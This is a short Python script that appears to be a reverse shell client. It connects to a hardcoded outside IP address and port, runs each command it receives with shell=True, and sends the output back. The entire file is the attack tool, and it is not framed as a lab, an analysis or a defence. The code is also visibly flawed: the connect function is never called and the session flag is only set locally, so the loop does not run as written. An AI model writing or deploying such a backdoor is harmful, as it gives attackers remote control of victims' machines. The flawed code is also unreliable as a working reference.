# Imports
from ctypes.wintypes import INT
import socket
import subprocess

# Setting Up IP/Sockets
REMOTE_HOST = '119.94.11.57' 
REMOTE_PORT = 8081 # 2222
client = socket.socket()
insesh = False

# Initializing Connection
def findhost():
    print("[-] Connection Initiating...")
    try:
        client.connect((REMOTE_HOST, REMOTE_PORT))
        print("[!] Connection initiated!")
        insesh = True
    except:
        print("[X] Connection failed")
        findhost()
        insesh = False

# Runtime Loop
while insesh == True:

    print("[-] Awaiting commands...")
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    print("[+] Sending response...")
    client.send(output + output_error)